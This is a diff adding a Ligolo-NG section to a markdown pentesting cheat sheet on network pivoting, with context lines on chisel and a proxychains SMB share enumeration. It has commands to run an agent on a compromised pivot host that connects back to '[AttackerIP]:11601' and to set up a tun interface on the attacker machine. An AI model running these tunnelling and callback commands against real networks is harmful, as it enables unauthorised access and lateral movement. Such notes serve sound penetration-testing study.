@@ -98,3 +98,22 @@ sudo chisel client [IP]:[port] socks
 sudo proxychains4 -q nxc smb $IP -u [user] -p [pass] --shares
 ```
 
+## [Ligolo-NG](https://github.com/nicocha30/ligolo-ng)
+#### Pivot Host Setup
+* Upload the appropriate binary to the pivot host
+* Execute the agent on the pivot host
+```bash
+# Linux & Windows
+./agent -connect [AttackerIP]:11601
+```
+#### Attacker Machine Setup
+* Create the interface for Ligolo to use
+```bash
+sudo ip tuntap add user <username> mode tun ligolo
+
+sudo ip link set ligolo up
+
+# Verify iface added
+ip addr show ligolo
+```
+# Test this out for verification before proceeding
